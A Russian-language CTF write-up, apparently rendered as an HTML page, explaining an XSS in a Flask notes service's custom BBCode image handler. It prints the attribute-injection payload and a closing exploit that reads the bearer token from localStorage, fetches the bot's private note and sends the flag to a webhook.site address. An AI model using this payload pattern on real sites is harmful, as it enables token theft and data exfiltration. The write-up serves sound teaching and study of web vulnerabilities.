  <header class="bg-white shadow p-4">
    <h1 class="text-2xl font-bold">Test writeup SAS CTF</h1>
    <nav class="mt-2">
      <a href="/" class="text-blue-600 hover:underline">Home</a>

  <main class="max-w-3xl mx-auto p-6 bg-white rounded-lg shadow my-6">
    <div id="content"></div>
  </main>
  <script>
    const content = `<p>Приложение представляет из  себя классический ctf таск на xss - есть сервис заметок и бот, переходящий по ссылке на заметку пользователя (оставив предварительно у себя на аккаунте приватную заметку с флагом).\nРассматривая функциональность сервиса можно обратить внимание на несколько нетипичных для сервиса с Flask на бэкенде вещей:</p>\n<ul>\n<li>для авторизации используется не <code>session</code> встроенный в фреймворк, а <code>jwt</code> токен в запросах вида.</li>\n</ul>\n<pre><code>GET /api/posts?page=1&amp;per_page=5 HTTP/1.1\nHost: [::1]\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0ODE2MzY0NywianRpIjoiODEwZjU4ODItZmE2Mi00NGVmLTg2NDMtYWM0OTNlZjRhZDA1IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRhOWIzNjQyLWY0NDMtNGIwNS1iMjAzLWVkOGM0N2E0NTA0ZCIsIm5iZiI6MTc0ODE2MzY0NywiZXhwIjoxNzQ4MTY3MjQ3LCJsb2dpbl90aW1lIjoxNzQ4MTYzNjQ3LjMxMDQ3fQ.KO6djKOdHCLN601cxw7weVtMM9aN5kcxnG589LjVKtY\n</code></pre>\n<p>причем <code>jwt</code> - даже не куки а именно <code>Authorization</code> заголовок.</p>\n<ul>\n<li>во время использования сервиса бросается в глаза возможность отставлять комментарии под заметками которой часто нет в тасках подобного вида.</li>\n<li>в поле комментария отображается очень подозрительная надпись\n![[Pasted image 20250527201945.png]]\nПредлагается использовать некий язык разметки под названием <code>BBCode</code> а как мы знаем в реалкейсах очень часто встречается xss из-за WYSIWYG-редакторов при внедрении html в комментарии или электронную почту или при использовании markdown.</li>\n</ul>\n<h2>Первичное предположение уязвимости</h2>\n<ol>\n<li>Проблема в BBCode</li>\n<li>Проблема в JWT</li>\n</ol>\n<h2>Проблема в BBCode</h2>\n<p>Открываем код сервиса в попытке проверить зависимости и посмотреть не устарела ли версия модуля с поддержкой BBCode однако его не нахожу, обработка BBCode кастомная что еще раз наталкивает на мысли об уязвимой реализации.\nСмотрим <code>backend/app/routes/comments.py</code></p>\n<pre><code>@comments_bp.route(\'/user/&lt;user_id&gt;/posts/&lt;post_id&gt;\', methods=[\'POST\'])\n@jwt_required()\ndef create_comment(user_id, post_id):\n	....\n    parser = BBCodeParser()\n    content_html = parser.parse(content)\n	....\n</code></pre>\n<p>Перейдем в <code>backend/app/utils/bb_parser.py</code> и рассмотрим код <code>BBCodeParser</code>.</p>\n<pre><code>def parse(self, text):\n	if not text:\n		return &quot;&quot;\n\n	escaped_text = html.escape(text)\n	\n	result = escaped_text\n	for tag in self.allowed_tags:\n		if tag in self.tag_handlers:\n			result = self.tag_handlers[tag](result)\n	\n	return result\n</code></pre>\n<blockquote>\n<p>Рассмотрим процесс обработки обычной xss нагрузки \`<img src=1 onerror=alert(1)>.\nСначала весь текст экранируется с помощью html.escape(text). Это преобразует специальные HTML-символы в их безопасные эквиваленты:\n- &lt; → &lt;\n- &gt; → &gt;\n- &amp; → &amp;</p>\n</blockquote>\n<pre><code>s = s.replace(&quot;&amp;&quot;, &quot;&amp;amp;&quot;) # Must be done first!\ns = s.replace(&quot;&lt;&quot;, &quot;&amp;lt;&quot;)\ns = s.replace(&quot;&gt;&quot;, &quot;&amp;gt;&quot;)\nif quote:\n	s = s.replace(\'&quot;\', &quot;&amp;quot;&quot;)\n	s = s.replace(\'\\\'\', &quot;&amp;#x27;&quot;)\nreturn s\n</code></pre>\n<blockquote>\n<p>На выходе функции получаем <code>&amp;lt;img src=1 onerror=alert(1)&amp;gt;</code>.</p>\n</blockquote>\n<p>При просмотре того как обрабатывалась бы обычная xss-нагрузка видим что хотя код ниже отработал, он бы ничего не сделал.</p>\n<pre><code>for tag in self.allowed_tags:\n	if tag in self.tag_handlers:\n		result = self.tag_handlers[tag](result)\n</code></pre>\n<p>Согласно логики работы парсера BBCode для того чтобы разметка img была обработана она должна соответствовать regex.</p>\n<pre><code>simple_pattern = r\'\\[img\\](https?://[^&quot;\\\'\\[\\]&lt;&gt;]+?\\.(?:jpg|jpeg|png|gif))\\[/img\\]\'\n</code></pre>\n<p>Полный код обработчика тега img представлен ниже.</p>\n<pre><code>    def _handle_image(self, text):\n        simple_pattern = r\'\\[img\\](https?://[^&quot;\\\'\\[\\]&lt;&gt;]+?\\.(?:jpg|jpeg|png|gif))\\[/img\\]\'\n        text = re.sub(simple_pattern, \n                      r\'&lt;img src=&quot;\\1&quot; alt=&quot;User posted image&quot; style=&quot;max-width:100%;&quot;&gt;\', \n                      text)\n\n        dim_pattern = r\'\\[img=(\\d+),(\\d+)\\](https?://[^&quot;\\\'\\[\\]&lt;&gt;]+?\\.(?:jpg|jpeg|png|gif))\\[/img\\]\'\n        text = re.sub(dim_pattern, \n                      r\'&lt;img src=&quot;\\3&quot; width=&quot;\\1&quot; height=&quot;\\2&quot; alt=&quot;User posted image&quot; style=&quot;max-width:100%;&quot;&gt;\', \n                      text)\n\n        attr_pattern = r\'\\[img ([^\\]]+)\\](https?://[^&quot;\\\'\\[\\]&lt;&gt;]+?\\.(?:jpg|jpeg|png|gif))\\[/img\\]\'\n        \n        def img_attr_replacer(match):\n            attrs_str = match.group(1)\n            img_url = match.group(2)\n            return f\'&lt;img src=&quot;{img_url}&quot; {attrs_str} style=&quot;max-width:100%;&quot;&gt;\'\n            \n        text = re.sub(attr_pattern, img_attr_replacer, text)\n        \n        return text\n</code></pre>\n<p>Регулярное выражение attr_pattern находит тег вида <code>[img атрибуты]URL[/img]</code>.</p>\n<ul>\n<li>attrs_str — это строка атрибутов (в нашем случае onerror=alert(1)).</li>\n<li>img_url — это URL изображения <code>(http://example.com/image.jpg)</code>.</li>\n<li>Функция img_attr_replacer вставляет attrs_str напрямую в HTML-тег <img> без какой-либо фильтрации.</li>\n</ul>\n<h4>Пример обработки</h4>\n<pre><code>def img_attr_replacer(match):\n            attrs_str = match.group(1)\n            img_url = match.group(2)\n            return f\'&lt;img src=&quot;{img_url}&quot; {attrs_str} style=&quot;max-width:100%;&quot;&gt;\'\n</code></pre>\n<p>Для ввода \`[img onerror=alert(1)]http://example.com/image.jpg[/img]:</p>\n<ul>\n<li>match.group(1) = onerror=alert(1).</li>\n<li>match.group(2) = <code>http://example.com/image.jpg</code>\nРезультат замены <code>&lt;img src=&quot;http://example.com/image.jpg&quot; onerror=alert(1) style=&quot;max-width:100%;&quot;&gt;</code>\n![[Pasted image 20250527205710.png]]XSS найден. Боту передается как раз ссылка на наш пост, значит у него тоже сработает javascript.</li>\n</ul>\n<h4>Troubleshooting</h4>\n<p>К сожалению есть несколько проблем</p>\n<ul>\n<li>мы все еще не знаем адрес заметки бота</li>\n<li>раз не используется куки, просто написать в <code>fetch</code> строчку <code>credentials: \'include\'</code> для того чтобы использовать авторизацию пользователя не получится</li>\n</ul>\n<h5>Получаем токен авторизации</h5>\n<p>В браузере не встроен автоматический механизм запоминания токенов используемых в заголовке <code>Authorization</code>, значит это делается на фронте у пользователя. Посмотрим где хранятся токены (вероятно в localstorage)\nСмотрим код и видим строчки вида</p>\n<pre><code>interceptors.request.use((e=&gt;{const t=localStorage.getItem(&quot;DiarrheaTokenBearerInLocalStorageForSecureRequestsContactAdminHeKnowsHotToUseWeHaveManyTokensHereSoThisOneShouldBeUnique&quot;)\n</code></pre>\n<p>Проверяем в браузере - так и есть.\n![[Pasted image 20250527210950.png]]</p>\n<h5>Получаем uuid заметки бота</h5>\n<p>По адресу <code>/dashboard</code> фронтенд пользователя делает запрос вида</p>\n<pre><code>GET /api/posts?page=1&amp;per_page=5 HTTP/1.1\n</code></pre>\n<p>Получая в ответ</p>\n<pre><code>{\n  &quot;items&quot;: [\n    {\n      &quot;author&quot;: &quot;testtest&quot;,\n      &quot;comments_count&quot;: 1,\n      &quot;content&quot;: &quot;test&quot;,\n      &quot;created_at&quot;: &quot;2025-05-27T17:07:44.284123&quot;,\n      &quot;id&quot;: 1,\n      &quot;top_comments&quot;: [\n        {\n          &quot;author&quot;: &quot;testtest&quot;,\n          &quot;content&quot;: &quot;&lt;img src=\\&quot;http://example.com/image.jpg\\&quot; onerror=alert(1) style=\\&quot;max-width:100%;\\&quot;&gt;&quot;,\n          &quot;created_at&quot;: &quot;2025-05-27T17:56:53.432094&quot;,\n          &quot;id&quot;: 1,\n          &quot;post_id&quot;: 1,\n          &quot;user_id&quot;: &quot;b3e28d05-23b1-4d0c-8acb-cbd50bce2602&quot;\n        }\n      ],\n      &quot;updated_at&quot;: &quot;2025-05-27T17:07:44.284133&quot;,\n      &quot;user_id&quot;: &quot;b3e28d05-23b1-4d0c-8acb-cbd50bce2602&quot;\n    }\n  ],\n  &quot;page&quot;: 1,\n  &quot;pages&quot;: 1,\n  &quot;per_page&quot;: 5,\n  &quot;total&quot;: 1\n}\n</code></pre>\n<p>В свою очередь заметки доступны по адресу вида</p>\n<pre><code>@posts_bp.route(\'/user/&lt;user_id&gt;/posts/&lt;post_id&gt;\', methods=[\'GET\'])\n</code></pre>\n<p>Ввиду того, что мы знаем что комментарий оставляется ботом сразу после регистрации, <code>post_id</code>. Заметка будет лежать по адресу.</p>\n<pre><code>/user/&lt;user_id&gt;/posts/1\n</code></pre>\n<p>В свою очередь user_id нам известен из запроса на <code>/api/posts</code>.</p>\n<h5>Exploit</h5>\n<p>Таким образом эксплоит должен выполнять следующие действия.</p>\n<ol>\n<li>Получает token из localstorage</li>\n<li>Использует его в заголовке <code>Authorization: Bearer</code> далее</li>\n<li>Делает запрос на <code>/api/posts</code></li>\n<li>Получает <code>user_id</code></li>\n<li>Делает запрос на <code>/user/&lt;user_id&gt;/posts/&lt;post_id&gt;</code></li>\n<li>Получает флаг из <code>class=&quot;post-content&quot;</code></li>\n<li>Отправляет base64 флаг на webhook</li>\n</ol>\n<pre><code>fetch(&quot;/api/posts&quot;, {\n    headers: {\n        \'Authorization\': \`Bearer \${localStorage.getItem(&quot;DiarrheaTokenBearerInLocalStorageForSecureRequestsContactAdminHeKnowsHotToUseWeHaveManyTokensHereSoThisOneShouldBeUnique&quot;)}\`\n    }\n})\n.then(response =&gt; response.json())\n.then(data =&gt; {\n    return fetch(\`/api/posts/user/\${data.items[0].user_id}/posts/1\`, { \n        headers: {\n            \'Authorization\': \`Bearer \${localStorage.getItem(&quot;DiarrheaTokenBearerInLocalStorageForSecureRequestsContactAdminHeKnowsHotToUseWeHaveManyTokensHereSoThisOneShouldBeUnique&quot;)}\`\n        } \n    });\n})\n.then(response =&gt; response.json())\n.then(flag =&gt; {\n    const content = flag.comments.items[0].content;\n    fetch(\`https://webhook.site/ce7bcd4f-0512-40d5-886b-168da9b25574?flag=\${btoa(content)}\`);\n})\n</code></pre>\n`;
    const root = ReactDOM.createRoot(document.getElementById('content'));
    root.render(
      React.createElement(ReactMarkdown, { 
        children: content,
        remarkPlugins: [window.remarkGfm]
      })
    );
  </script>
